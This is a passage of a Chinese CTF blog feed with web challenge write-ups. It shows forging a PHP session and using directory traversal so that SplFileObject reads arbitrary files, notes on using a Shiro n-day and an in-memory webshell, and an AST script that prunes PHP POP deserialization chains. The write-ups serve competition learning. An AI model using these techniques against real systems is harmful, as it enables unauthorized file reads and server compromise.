class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>因 <code>echo</code> 对象会触发对象的 <code>__toString</code> 魔术方法，如果能找到啥对象实例化后的 <code>__toString </code>魔术方法，会对 <code>$path</code> 进行一些利用（如输出这个参数文件内容，执行这个参数命令之类的）就好了。</p><p>刚好找到一个脚本 （</p><p>可以查看PHP原生类即内置类，查看拥有所需魔术方法的类如下</p><p>这里只获取 <code>__toString</code>，所以把其他注释了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = get_declared_classes();<span class="comment">//获取所有已定义类</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="variable">$methods</span> = get_class_methods(<span class="variable">$class</span>);        <span class="comment">//获取当前类所拥有的方法</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"><span class="comment">//            &#x27;__destruct&#x27;,</span></span><br><span class="line">            <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line"><span class="comment">//            &#x27;__wakeup&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__call&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__callStatic&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__get&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__set&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__isset&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__unset&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__invoke&#x27;,</span></span><br><span class="line"><span class="comment">//            &#x27;__set_state&#x27;            //调用var_export导出类时被调用</span></span><br><span class="line">        ))) &#123;</span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;<span class="subst">$class</span>::<span class="subst">$method</span>&quot;</span>;<span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Exception::__toString</span><br><span class="line">ErrorException::__toString</span><br><span class="line">Error::__toString</span><br><span class="line">ParseError::__toString</span><br><span class="line">TypeError::__toString</span><br><span class="line">ArgumentCountError::__toString</span><br><span class="line">ArithmeticError::__toString</span><br><span class="line">DivisionByZeroError::__toString</span><br><span class="line">ClosedGeneratorException::__toString</span><br><span class="line">DOMException::__toString</span><br><span class="line">LogicException::__toString</span><br><span class="line">BadFunctionCallException::__toString</span><br><span class="line">BadMethodCallException::__toString</span><br><span class="line">DomainException::__toString</span><br><span class="line">InvalidArgumentException::__toString</span><br><span class="line">LengthException::__toString</span><br><span class="line">OutOfRangeException::__toString</span><br><span class="line">RuntimeException::__toString</span><br><span class="line">OutOfBoundsException::__toString</span><br><span class="line">OverflowException::__toString</span><br><span class="line">RangeException::__toString</span><br><span class="line">UnderflowException::__toString</span><br><span class="line">UnexpectedValueException::__toString</span><br><span class="line">CachingIterator::__toString</span><br><span class="line">RecursiveCachingIterator::__toString</span><br><span class="line">SplFileInfo::__toString</span><br><span class="line">DirectoryIterator::__toString</span><br><span class="line">FilesystemIterator::__toString</span><br><span class="line">RecursiveDirectoryIterator::__toString</span><br><span class="line">GlobIterator::__toString</span><br><span class="line">SplFileObject::__toString</span><br><span class="line">SplTempFileObject::__toString</span><br><span class="line">IntlException::__toString</span><br><span class="line">AssertionError::__toString</span><br><span class="line">PDOException::__toString</span><br><span class="line">PharException::__toString</span><br><span class="line">Phar::__toString</span><br><span class="line">PharData::__toString</span><br><span class="line">PharFileInfo::__toString</span><br><span class="line">ReflectionException::__toString</span><br><span class="line">ReflectionFunctionAbstract::__toString</span><br><span class="line">ReflectionFunction::__toString</span><br><span class="line">ReflectionParameter::__toString</span><br><span class="line">ReflectionType::__toString</span><br><span class="line">ReflectionNamedType::__toString</span><br><span class="line">ReflectionMethod::__toString</span><br><span class="line">ReflectionClass::__toString</span><br><span class="line">ReflectionObject::__toString</span><br><span class="line">ReflectionProperty::__toString</span><br><span class="line">ReflectionClassConstant::__toString</span><br><span class="line">ReflectionExtension::__toString</span><br><span class="line">ReflectionZendExtension::__toString</span><br><span class="line">mysqli_sql_exception::__toString</span><br><span class="line">SimpleXMLElement::__toString</span><br><span class="line">SimpleXMLIterator::__toString</span><br><span class="line">SoapFault::__toString</span><br><span class="line">SodiumException::__toString</span><br></pre></td></tr></table></figure><p>看到一些反射之类的，当然发现了一个 <code>SplFileObject</code> 类，发现他的 <a href="https://www.php.net/manual/en/splfileobject.tostring">__toString</a> 方法是 <a href="https://www.php.net/manual/en/splfileobject.fgets.php">SplFileObject::fgets</a> 方法的别名，作用是一行行文件读取。 flag 文件一般是一行，刚好满足要求。</p><h3 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h3><p>创建一个 flag 文件，内容为</p><p><img src="/img/2021hmb-offline/image-20210731023959338.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023959338.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023959338"></p><p>先构造 session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.save_path&#x27;</span>, <span class="string">&#x27;/tmp&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;paths&#x27;</span>] = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;paths&#x27;</span>][<span class="string">&quot;/tmp/flag&quot;</span>] = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br></pre></td></tr></table></figure><p>然后访问一下这个文件，记得看请求的 Cookie: PHPSESSID 的值，然后到本地找到文件，把生成的内容复制一下，粘贴到 content 字段。因为php session 都是sess开头的，所以通过目录穿越写入 sess_tari</p><p><img src="/img/2021hmb-offline/image-20210731023533505.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023533505.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023533505"></p><p>写入session后</p><p><img src="/img/2021hmb-offline/image-20210731023544822.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023544822.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023544822"></p><p>实例化时，实际是实例化了 <code>SplFileObject(&quot;/tmp/flag&quot;)</code></p><p><img src="/img/2021hmb-offline/image-20210731023859135.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023859135.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023859135"></p><p><img src="/img/2021hmb-offline/image-20210731023930040.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023930040.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023930040"></p><p>然后就会输出任意我们想输出的文件内容了</p><p><img src="/img/2021hmb-offline/image-20210731023939310.png" class="lazyload" data-srcset="/img/2021hmb-offline/image-20210731023939310.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210731023939310"></p><p>搞定~</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[1] <a href="https://www.freebuf.com/articles/web/263710.html">https://www.freebuf.com/articles/web/263710.html</a></p><p>[2] <a href="https://mp.weixin.qq.com/s/ucjyuXnWn4PkiD_40Eydkw">https://mp.weixin.qq.com/s/ucjyuXnWn4PkiD_40Eydkw</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctf比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctf比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021强网杯 Web Writeup</title>
      <link href="//p/2021/2021qwb/"/>
      <url>//p/2021/2021qwb/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>今年题目质量还不错，竟然还有内网渗透部分，2333，因为平常CTF比较少</p><p>毕设刚好是做代码审计相关的，刚刚好又在 POP链这个题用上了，还挺开心~</p><h2 id="0x1-Hard-Penetration"><a href="#0x1-Hard-Penetration" class="headerlink" title="0x1 Hard_Penetration"></a>0x1 Hard_Penetration</h2><p>by <a href="https://www.yuque.com/challenger-sfhjb">Challenger</a></p><p>发现这是 shiro n day漏洞</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623503981777-399c576f-57ac-4c63-af5f-54f704c0b32b.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623503981777-399c576f-57ac-4c63-af5f-54f704c0b32b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>顺便写了个内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623591377071-1ae7f649-8f2f-4c20-9ce6-ce8477e85435.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623591377071-1ae7f649-8f2f-4c20-9ce6-ce8477e85435.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>连上去发现权限比较小，需要提权</p><p>然后尝试了 msf自带的，无果</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623503999749-41b60c7e-8a62-40c0-9b50-737b64819ad8.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623503999749-41b60c7e-8a62-40c0-9b50-737b64819ad8.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>尝试</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><p><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p><p>无果</p><p>有点像mysql udf 提权，不过不知道用户名和密码</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623508044718-e9dcc028-a7ed-458e-8bba-ad27fbba6443.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623508044718-e9dcc028-a7ed-458e-8bba-ad27fbba6443.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>源码包也找不到</p><p>看了下 flag 是<code>www-data</code> 权限，本机可能还有服务，扫了一下发现在 8005端口，然后代理转发出来（转发过程可参考 0x4 EasyWeb 的端口转发过程）</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623543222762-45a39f9d-0f4f-4362-be38-4761572b7fab.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623543222762-45a39f9d-0f4f-4362-be38-4761572b7fab.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>报错发现是 thinkphp 3.1.3，然后链接显示去 baocms</p><p><a href="https://github.com/IsCrazyCat/demo-baocms-v17.1">https://github.com/IsCrazyCat/demo-baocms-v17.1</a></p><p>审计走起</p><p>看了下，大概路由和控制器的对应关系如下</p><ul><li><a href="http://119.23.55.232:670/wap/">http://119.23.55.232:670/wap/</a> 前端就在 themes/Wap/ 里找，后端方法在/Lib/Action/Wap 里找，和URL对应就好</li><li>同理 <a href="http://119.23.55.232:670/admin/">http://119.23.55.232:670/admin/</a> 前端就在 themes/Admin/ 里找，后端方法在/Lib/Action/Admin 里找  </li><li>然后后端方法的 xxxxAction.class.php 中的 Action.class.php 应该是其的加载规范，这个和laravel有点像</li></ul><p>等wp吧。。。</p><p>还是没找到漏洞点。。。</p><p>#更新 </p><p>赛后和xlw师兄交流了一波，发现漏洞点在</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623676109592-873b55ab-b2cb-411d-93a4-89f794643281.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623676109592-873b55ab-b2cb-411d-93a4-89f794643281.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>额，完全看不出来。。控制器太多了，，有点难看不出来，太菜了（<img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623676126137-c634a5f4-e522-4133-b147-f2396c808b09.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1623676126137-c634a5f4-e522-4133-b147-f2396c808b09.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="0x2-pop-master"><a href="#0x2-pop-master" class="headerlink" title="0x2 pop_master"></a>0x2 pop_master</h2><p>by <a href="https://tari.moe/">tari</a></p><p>index.php 代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;class.php&quot;;</span><br><span class="line">//class.php.txt</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$a = $_GET[&#x27;pop&#x27;];</span><br><span class="line">$b = $_GET[&#x27;argv&#x27;];</span><br><span class="line">$class = unserialize($a);</span><br><span class="line">$class-&gt;NGPaqV($b);</span><br></pre></td></tr></table></figure><p>明显的反序列化，但看 <code>class.php.txt</code> 后发现很乱。</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/txt/2789727/1623495839679-38ed3abf-ecad-4add-aff7-7ed2c8bf5dd7.txt">📎class.php.txt</a></p><p>很多链是混淆的，有的是会覆盖值的，导致链就算构造了也无法进行反序列化</p><p>根据如下4点思路去过滤</p><ol><li>eval 没被引用，过滤</li><li>for 循环中会覆盖传入参数值，过滤</li><li>eval 前会覆盖值参数值，过滤</li><li>除了入口函数外，其他函数只被引用一次的，过滤</li></ol><p>第2和3会覆盖值的是重点，第1和4，一次性过滤多点加快收敛速度（节约下一次运行脚本时间）</p><p>编写脚本如下，根据 AST 去剪切不需要的节点（即根据上面4点去除无用或会影响结果的函数）</p><p>之所以用 AST 是因相比正则或其他更能精准的剪切节点，<a href="https://github.com/nikic/PHP-Parser">PHP AST库传送门</a>。</p><ul><li><code>$entryFunc</code> 入口函数名称，根据实际情况来，即 index.php 里调用的函数 <code>$class-&gt;NGPaqV($b);</code></li><li>PHP运行内存默认是 128M，在解析18w行代码会因内存不足退出，我这里php.ini 增加到 8196M</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 16w 行代码大概跑 105s, 定义300s肯定不会超时</span></span><br><span class="line">ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="string">&#x27;300&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">Error</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">NodeDumper</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">ParserFactory</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">PhpParser</span>\<span class="title">PrettyPrinter</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入口函数名称</span></span><br><span class="line"><span class="variable">$entryFunc</span> = <span class="string">&#x27;NGPaqV&#x27;</span>;</span><br><span class="line"><span class="comment">// 输入文件</span></span><br><span class="line"><span class="variable">$inputPhpFile</span> = <span class="string">&#x27;./class.php&#x27;</span>;</span><br><span class="line"><span class="comment">// 输出文件</span></span><br><span class="line"><span class="variable">$outputPhpFile</span> = <span class="string">&#x27;./class.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = file_get_contents(<span class="variable">$inputPhpFile</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] get file content done&#x27;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$parser</span> = (<span class="keyword">new</span> ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$ast</span> = <span class="variable">$parser</span>-&gt;parse(<span class="variable">$code</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$error</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Parse error: <span class="subst">&#123;$error-&gt;getMessage()&#125;</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] parse done&#x27;</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计数删了多少个函数</span></span><br><span class="line"><span class="variable">$deleteCnt</span> = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// $dumper = new NodeDumper;</span></span><br><span class="line"><span class="comment">// echo $dumper-&gt;dump($ast) . &quot;\n&quot;;</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ast</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$subclass</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$subclass</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kk</span>=&gt;<span class="variable">$classMember</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$classMember</span> <span class="keyword">instanceof</span> PhpParser\Node\Stmt\ClassMethod) &#123;</span><br><span class="line">            <span class="comment">// echo $dumper-&gt;dump($classMember) . &quot;\n&quot;;</span></span><br><span class="line">            <span class="comment">// 除入口函数外的类方法没有被引用则删除</span></span><br><span class="line">            <span class="keyword">if</span> (substr_count(<span class="variable">$code</span>, <span class="variable">$classMember</span>-&gt;name-&gt;name) === <span class="number">1</span> &amp;&amp; <span class="variable">$classMember</span>-&gt;name-&gt;name !== <span class="variable">$entryFunc</span>) &#123;</span><br><span class="line">                <span class="variable">$deleteCnt</span>++;</span><br><span class="line">                <span class="keyword">unset</span>(<span class="variable">$subclass</span>-&gt;stmts[<span class="variable">$kk</span>]);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (! <span class="variable">$classMember</span>-&gt;params) &#123; <span class="comment">// 只获取第一个参数</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$param</span> = <span class="variable">$classMember</span>-&gt;params[<span class="number">0</span>]-&gt;var-&gt;name; <span class="comment">// 获取方法参数</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$classMember</span>-&gt;stmts <span class="keyword">as</span> <span class="variable">$kkkk</span> =&gt; <span class="variable">$subStatements</span>) &#123;</span><br><span class="line">                <span class="comment">// echo $dumper-&gt;dump($subStatements) . &quot;\n&quot;;</span></span><br><span class="line">                <span class="comment">// 参数</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$subStatements</span> <span class="keyword">instanceof</span> PhpParser\Node\Stmt\For_) &#123;</span><br><span class="line">                    <span class="variable">$assignLeft</span> =  <span class="variable">$subStatements</span>-&gt;stmts[<span class="number">0</span>]-&gt;expr-&gt;var-&gt;name;</span><br><span class="line">                    <span class="comment"># 参数会被赋值覆盖</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$param</span> === <span class="variable">$assignLeft</span>) &#123;</span><br><span class="line">                        <span class="comment"># 删除该节点</span></span><br><span class="line">                        <span class="variable">$deleteCnt</span>++;</span><br><span class="line">                        <span class="keyword">unset</span>(<span class="variable">$subclass</span>-&gt;stmts[<span class="variable">$kk</span>]);</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$subStatements</span> <span class="keyword">instanceof</span> PhpParser\Node\Stmt\Expression) &#123;</span><br><span class="line">                    <span class="comment">// 参数值会被覆盖</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$subStatements</span>-&gt;expr <span class="keyword">instanceof</span>  PhpParser\Node\Expr\Assign) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$param</span> === <span class="variable">$subStatements</span>-&gt;expr-&gt;var-&gt;name) &#123;</span><br><span 